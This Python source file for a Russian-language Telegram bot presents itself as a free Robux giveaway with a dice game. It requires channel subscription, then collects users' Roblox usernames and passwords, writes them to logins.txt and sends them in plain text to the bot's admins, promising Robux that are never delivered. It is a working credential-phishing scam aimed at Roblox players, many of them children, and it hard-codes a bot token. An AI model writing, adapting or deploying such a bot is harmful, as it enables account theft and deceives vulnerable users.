import random
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime
import json
import os

# === НАСТРОЙКИ ===
TOKEN = '8468207969:AAFtmIs-fM1untY9khU1N9l3ysAaQKfCNb8'
ADMIN_IDS = [6893832048]  # Начальные админы
MAIN_ADMIN_ID = 6893832048  # Главный админ

CHECK_CHANNEL = '@OFF_Roblox'          # Канал для проверки подписки
OFFICIAL_CHANNEL = '@RobloxRu_Official'  # Канал в кнопке "Наш канал"

# === ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ ===
ADMINS_FILE = 'admins.json'
USER_DATA_FILE = 'user_data.json'

# === ХРАНИЛИЩА ===
user_states = {}       # 'awaiting_username', 'awaiting_password', 'awaiting_support'
user_data = {}         # временные логины/пароли
support_active = {}    # ID пользователей и их сообщения для ответа {user_id: {"message": текст, "message_id": id}}
authorized_users = set() # ID пользователей, которые уже авторизовались
user_robux = {}        # Баланс робуксов пользователей

# === ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ ===
def load_admins():
    """Загрузка списка админов из файла"""
    global ADMIN_IDS
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
                ADMIN_IDS = json.load(f)
        except:
            ADMIN_IDS = [6893832048]  # Значение по умолчанию при ошибке

def save_admins():
    """Сохранение списка админов в файл"""
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(ADMIN_IDS, f)

def load_user_data():
    """Загрузка данных пользователей из файла"""
    global authorized_users, user_robux
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                authorized_users = set(data.get('authorized_users', []))
                user_robux = data.get('user_robux', {})
        except:
            authorized_users = set()
            user_robux = {}

def save_user_data():
    """Сохранение данных пользователей в файл"""
    data = {
        'authorized_users': list(authorized_users),
        'user_robux': user_robux
    }
    with open(USER_DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f)

# === ОСНОВНЫЕ ФУНКЦИИ ===
def save_to_file(login, password):
    with open('logins.txt', 'a', encoding='utf-8') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{timestamp}\nLogin: {login}\nPassword: {password}\n\n")

async def is_subscribed(context, user_id, channel):
    try:
        member = await context.bot.get_chat_member(channel, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def get_main_menu(user_id):
    buttons = [
        [
            InlineKeyboardButton("📢 Наш канал", url=f"https://t.me/{OFFICIAL_CHANNEL.lstrip('@')}"),
            InlineKeyboardButton("💬 Отзывы", url="https://t.me/Otz_DS")
        ],
        [
            InlineKeyboardButton("🎲 Бросить кубик", callback_data='dice'),
            InlineKeyboardButton("🛠 Техподдержка", callback_data='support')
        ]
    ]

    if user_id not in authorized_users:
        buttons.append([InlineKeyboardButton("🔐 Авторизоваться", callback_data='login')])
    else:
        robux_balance = user_robux.get(user_id, 0)
        buttons.append([InlineKeyboardButton(f"💰 Баланс: {robux_balance} Robux", callback_data='balance')])

    if user_id in ADMIN_IDS:
        buttons.append([InlineKeyboardButton("⚙️ Админ-панель", callback_data='admin_panel')])

    return InlineKeyboardMarkup(buttons)

def add_robux(user_id, amount):
    if user_id not in user_robux:
        user_robux[user_id] = 0
    user_robux[user_id] += amount
    save_user_data()
    return user_robux[user_id]

def reset_user(user_id):
    """Полный сброс пользователя из всех баз данных"""
    user_states.pop(user_id, None)
    user_data.pop(user_id, None)
    support_active.pop(user_id, None)
    authorized_users.discard(user_id)
    user_robux.pop(user_id, None)
    save_user_data()

def add_admin(user_id):
    """Добавление пользователя в админы"""
    if user_id not in ADMIN_IDS:
        ADMIN_IDS.append(user_id)
        save_admins()
        return True
    return False

def remove_admin(user_id):
    """Удаление пользователя из админов"""
    if user_id in ADMIN_IDS and user_id != MAIN_ADMIN_ID:  # Нельзя удалить главного админа
        ADMIN_IDS.remove(user_id)
        save_admins()
        return True
    return False

# === АДМИН КОМАНДЫ ===
async def reset_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет прав доступа!")
        return

    try:
        target_user_id = int(context.args[0])
        reset_user(target_user_id)
        await update.message.reply_text(f"✅ Пользователь {target_user_id} полностью сброшен из всех баз данных")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Использование: /reset user_id")

async def addadmin_command(update, context):
    user_id = update.effective_user.id

    # Только главный админ может добавлять админов
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("❌ Только главный администратор может добавлять новых админов!")
        return

    try:
        target_user_id = int(context.args[0])
        if add_admin(target_user_id):
            await update.message.reply_text(f"✅ Пользователь {target_user_id} добавлен в админы")
        else:
            await update.message.reply_text(f"⚠️ Пользователь {target_user_id} уже является админом")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Использование: /addadmin user_id")

async def removeadmin_command(update, context):
    user_id = update.effective_user.id

    # Только главный админ может удалять админов
    if user_id != MAIN_ADMIN_ID:
        await update.message.reply_text("❌ Только главный администратор может удалять админов!")
        return

    try:
        target_user_id = int(context.args[0])
        if remove_admin(target_user_id):
            await update.message.reply_text(f"✅ Пользователь {target_user_id} удален из админов")
        else:
            await update.message.reply_text(f"❌ Не удалось удалить пользователя {target_user_id} из админов")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Использование: /removeadmin user_id")

async def admins_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет прав доступа!")
        return

    admins_list = "\n".join([f"• {admin_id} {'👑' if admin_id == MAIN_ADMIN_ID else ''}" for admin_id in ADMIN_IDS])
    await update.message.reply_text(f"👑 Список админов:\n{admins_list}")

async def stats_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ У вас нет прав доступа!")
        return

    stats_text = (
        f"📊 Статистика бота:\n"
        f"• Всего пользователей: {len(authorized_users)}\n"
        f"• Всего админов: {len(ADMIN_IDS)}\n"
        f"• Активные сессии: {len(user_states)}\n"
        f"• Активные обращения: {len(support_active)}"
    )
    await update.message.reply_text(stats_text)

# === ОСНОВНЫЕ ХЕНДЛЕРЫ ===
async def start(update, context):
    user_id = update.effective_user.id

    if update.message:
        message = update.message
    elif update.callback_query:
        message = update.callback_query.message
    else:
        return

    if not await is_subscribed(context, user_id, CHECK_CHANNEL):
        join_btn = InlineKeyboardButton("➕ Подписаться", url=f"https://t.me/{CHECK_CHANNEL.lstrip('@')}")
        check_btn = InlineKeyboardButton("✅ Проверить подписку", callback_data='check_sub')
        await message.reply_text(
            f"Подпишись на канал {CHECK_CHANNEL}, чтобы пользоваться ботом!",
            reply_markup=InlineKeyboardMarkup([[join_btn], [check_btn]])
        )
        return

    await message.reply_text(
        "👋 ʙыбᴇᴩиᴛᴇ дᴇйᴄᴛʙиᴇ\n"
       "\nБоᴛ ᴄоздᴀн дᴧя нᴀᴋᴩуᴛᴋи ᴩобуᴋᴄоʙ нᴀ ʙᴀɯ ᴀᴋᴋᴀунᴛ!\n"
       "\nВыʙод доᴄᴛуᴨᴇн ᴛоᴧьᴋо 1 ᴩᴀз ʙ дᴇнь.\n"
       "\n⚠️ ᴨᴩи ʙʙодᴇ нᴇʙᴇᴩных дᴀнных ʙы ʍожᴇᴛᴇ быᴛь зᴀбᴧоᴋиᴩоʙᴀны!",
        reply_markup=get_main_menu(user_id)
    )

async def button(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == 'check_sub':
        if await is_subscribed(context, user_id, CHECK_CHANNEL):
            await query.edit_message_text("✅ Спасибо за подписку!")
            context.user_data['from_callback'] = True
            await start(update, context)
        else:
            join_btn = InlineKeyboardButton("➕ Подписаться", url=f"https://t.me/{CHECK_CHANNEL.lstrip('@')}")
            check_btn = InlineKeyboardButton("✅ Проверить подписку", callback_data='check_sub')
            await query.edit_message_text(
                f"Вы не подписаны на {CHECK_CHANNEL}!",
                reply_markup=InlineKeyboardMarkup([[join_btn], [check_btn]])
            )
        return

    if not await is_subscribed(context, user_id, CHECK_CHANNEL):
        await query.edit_message_text("Сначала подпишитесь на канал!")
        return

    if query.data == 'login':
        user_states[user_id] = 'awaiting_username'
        await query.edit_message_text("📝 Введите ваш Roblox username:")

    elif query.data == 'dice':
        if user_id not in authorized_users:
            await query.edit_message_text(
                "❌ Сначала необходимо авторизоваться!",
                reply_markup=get_main_menu(user_id)
            )
            return

        dice_message = await context.bot.send_dice(
            chat_id=query.message.chat_id,
            emoji='🎲'
        )

        dice_value = dice_message.dice.value

        if dice_value == 1:
            robux_amount = 10
            new_balance = add_robux(user_id, robux_amount)
            result_text = f"🎯 ᴩᴇзуᴧьᴛᴀᴛ бᴩоᴄᴋᴀ: **{dice_value}**!\n🎉 **Поздᴩᴀʙᴧяᴇʍ! ʙы ʙыиᴦᴩᴀᴧи {robux_amount} Robux!**\n💰 Вʙᴀɯ бᴀᴧᴀнᴄ: **{new_balance} Robux**"
        else:
            result_text = f"🎯 ᴩᴇзуᴧьᴛᴀᴛ бᴩоᴄᴋᴀ: **{dice_value}**!\n😔 К ᴄожᴀᴧᴇнию, ʙы нᴇ ʙыиᴦᴩᴀᴧи Robux. Поᴨᴩобуйᴛᴇ ᴇɯᴇ ᴩᴀᴇ!"

        await query.message.reply_text(
            result_text,
            parse_mode='Markdown',
            reply_markup=get_main_menu(user_id)
        )

    elif query.data == 'support':
        user_states[user_id] = 'awaiting_support'
        await query.edit_message_text("📩 Напишите ваш вопрос:")

    elif query.data == 'balance':
        if user_id in authorized_users:
            balance = user_robux.get(user_id, 0)
            await query.edit_message_text(
                f"💰 Ваш текущий баланс: **{balance} Robux**\n\n"
                f"🎲 Бросайте кубик, чтобы выиграть больше Robux!",
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
        else:
            await query.edit_message_text(
                "❌ Сначала необходимо авторизоваться!",
                reply_markup=get_main_menu(user_id)
            )

    elif query.data == 'admin_panel':
        if user_id in ADMIN_IDS:
            # Показываем разные возможности в зависимости от прав
            if user_id == MAIN_ADMIN_ID:
                admin_panel_text = (
                    "⚙️ **Админ-панель (Главный админ)**\n\n"
                    "Доступные команды:\n"
                    "/addadmin [id] - Добавить админа\n"
                    "/removeadmin [id] - Удалить админа\n"
                    "/reset [id] - Сбросить пользователя\n"
                    "/admins - Список админов\n"
                    "/stats - Статистика бота"
                )
            else:
                admin_panel_text = (
                    "⚙️ **Админ-панель**\n\n"
                    "Доступные команды:\n"
                    "/reset [id] - Сбросить пользователя\n"
                    "/admins - Список админов\n"
                    "/stats - Статистика бота"
                )

            await query.edit_message_text(
                admin_panel_text,
                parse_mode='Markdown',
                reply_markup=get_main_menu(user_id)
            )
        else:
            await query.edit_message_text("❌ У вас нет прав доступа!")

async def handle_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Обработка ответов админа на сообщения поддержки
    if user_id in ADMIN_IDS:
        replied_msg = update.message.reply_to_message
        if replied_msg and replied_msg.from_user.id == context.bot.id:
            for uid, data in support_active.items():
                if "admin_message_id" in data and data["admin_message_id"] == replied_msg.message_id:
                    try:
                        await context.bot.send_message(
                            uid,
                            f"🛠 Ответ от поддержки:\n\n{text}"
                        )
                        await update.message.reply_text("✅ Ответ отправлен пользователю.")
                        support_active.pop(uid, None)
                        return
                    except Exception as e:
                        await update.message.reply_text(f"❌ Ошибка отправки: {e}")
                        return
            await update.message.reply_text("⚠️ Не найдено активное обращение для этого сообщения.")
            return

    # Обработка состояний пользователя
    if user_id in user_states:
        state = user_states[user_id]

        if state == 'awaiting_username':
            user_data[user_id] = {'username': text}
            user_states[user_id] = 'awaiting_password'
            await update.message.reply_text(f"Введите пароль от аккаунта **{text}**:", parse_mode='Markdown')
            return

        elif state == 'awaiting_password':
            if user_id not in user_data or 'username' not in user_data[user_id]:
                await update.message.reply_text("❌ Ошибка: сначала введите username")
                user_states.pop(user_id, None)
                return

            username = user_data[user_id]['username']
            password = text
            save_to_file(username, password)

            authorized_users.add(user_id)
            if user_id not in user_robux:
                user_robux[user_id] = 0
            save_user_data()

            for admin in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        admin,
                        f"🔔 Новая авторизация!\n\n"
                        f"ID: {user_id}\n@{update.effective_user.username or 'N/A'}\n"
                        f"Login: {username}\nPassword: {password}"
                    )
                except Exception as e:
                    print(f"Не отправилось админу: {e}")

            await update.message.reply_text(
                "✅ Успешный вход! Ожидайте начисления Робуксов.\n\n"
                "🎲 Теперь вы можете бросать кубик и выигрывать Robux!",
                reply_markup=get_main_menu(user_id)
            )
            user_states.pop(user_id, None)
            user_data.pop(user_id, None)
            return

        elif state == 'awaiting_support':
            support_active[user_id] = {
                "message": text,
                "user_message_id": update.message.message_id,
                "username": update.effective_user.username or 'N/A'
            }

            for admin in ADMIN_IDS:
                try:
                    admin_msg = await context.bot.send_message(
                        admin,
                        f"📩 Новое обращение в поддержку:\n"
                        f"ID: {user_id}\n"
                        f"Username: @{update.effective_user.username or 'N/A'}\n\n"
                        f"Сообщение: {text}\n\n"
                        f"💬 Ответьте на это сообщение, чтобы отправить ответ пользователю."
                    )
                    support_active[user_id]["admin_message_id"] = admin_msg.message_id
                except Exception as e:
                    print(f"Не отправилось админу: {e}")

            await update.message.reply_text("✅ Ваше сообщение отправлено! Ожидайте ответа.")
            user_states.pop(user_id, None)
            return

    await update.message.reply_text("Используйте кнопки меню:", reply_markup=get_main_menu(user_id))

# === ЗАПУСК ===
def main():
    load_admins()
    load_user_data()

    app = Application.builder().token(TOKEN).build()

    # Основные обработчики
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))

    # Обработчики команд админов
    app.add_handler(CommandHandler("reset", reset_command))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("removeadmin", removeadmin_command))
    app.add_handler(CommandHandler("admins", admins_command))
    app.add_handler(CommandHandler("stats", stats_command))

    # Обработчик текстовых сообщений
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()

if __name__ == '__main__':
    main()